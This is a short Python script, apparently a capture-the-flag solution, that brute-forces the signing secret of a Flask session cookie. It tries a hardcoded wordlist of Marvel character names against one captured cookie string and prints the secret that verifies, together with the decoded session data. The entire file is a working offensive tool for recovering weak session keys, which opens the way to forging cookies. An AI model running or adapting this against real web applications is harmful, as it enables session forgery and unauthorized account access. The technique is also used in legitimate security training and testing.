import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

wordlist = ["captain america", "iron man", "hulk", "black widow", "iron man", "hawkeye", "star lord", "groot", "black panther", "spider man", "drax", "ant man", "thanos", "dr strange", "gamora", "loki", "nick fury", "agent hill", "pepper potts", "jarvis", "falcon", "ultron", "thor", "rocket", "war machine", "vision", "scarlet witch"]

cookie_str=".eJyly0EKgzAQBdCrfP6mm9ADeI7uRGQ0owm1GUmmQhHv3t6hq7d6J8dlk5a0setPwn8wSlm1MvCRxBFNW7k5ZN9VKtwwKQSHbDliNntmvXO4wl97CDy0fkZ5e2LHXK3gJYXXF-4CNgk.ZozvAg.JM4HQrtlBZj_C6CZ_z_0HdLgqVA"
def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)
    return s.loads(cookie_str)


for secret_key in wordlist:
    try:
        cookie = decode_flask_cookie(secret_key, cookie_str)
    except:
        continue

    print(secret_key)
    print(cookie)
